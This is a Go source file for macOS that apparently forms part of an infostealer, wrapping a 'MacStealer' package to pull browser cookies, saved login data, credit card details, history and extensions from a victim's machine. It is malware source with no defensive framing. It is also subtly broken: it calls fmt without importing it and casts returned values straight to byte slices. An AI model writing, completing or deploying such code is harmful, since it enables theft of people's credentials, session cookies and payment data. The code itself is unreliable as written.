//go:build darwin

package main

import (
    "github.com/ultra-supara/MacStealer/browsingdata"
)

type DarwinBrowserDataExtractor struct{}

func (e *DarwinBrowserDataExtractor) ExtractCookies(path string) ([]byte, error) {
    cookies, err := browsingdata.GetCookie("", path)
    if err != nil {
        return nil, fmt.Errorf("failed to extract cookies: %w", err)
    }
    // Convert cookies to byte array for consistency
    return []byte(cookies), nil
}

func (e *DarwinBrowserDataExtractor) ExtractLoginData(path string) ([]byte, error) {
    loginData, err := browsingdata.GetLoginData("", path)
    if err != nil {
        return nil, fmt.Errorf("failed to extract login data: %w", err)
    }
    // Convert login data to byte array for consistency
    return []byte(loginData), nil
}

func (e *DarwinBrowserDataExtractor) ExtractCreditCards(path string) ([]byte, error) {
    creditCards, err := browsingdata.GetCreditCard("", path)
    if err != nil {
        return nil, fmt.Errorf("failed to extract credit cards: %w", err)
    }
    // Convert credit cards to byte array for consistency
    return []byte(creditCards), nil
}

func (e *DarwinBrowserDataExtractor) ExtractHistory(path string) ([]byte, error) {
    history, err := browsingdata.GetHistory(path)
    if err != nil {
        return nil, fmt.Errorf("failed to extract history: %w", err)
    }
    // Convert history to byte array for consistency
    return []byte(history), nil
}

func (e *DarwinBrowserDataExtractor) ExtractExtensions(path string) ([]byte, error) {
    extensions, err := browsingdata.GetExtension(path)
    if err != nil {
        return nil, fmt.Errorf("failed to extract extensions: %w", err)
    }
    // Convert extensions to byte array for consistency
    return []byte(extensions), nil
}
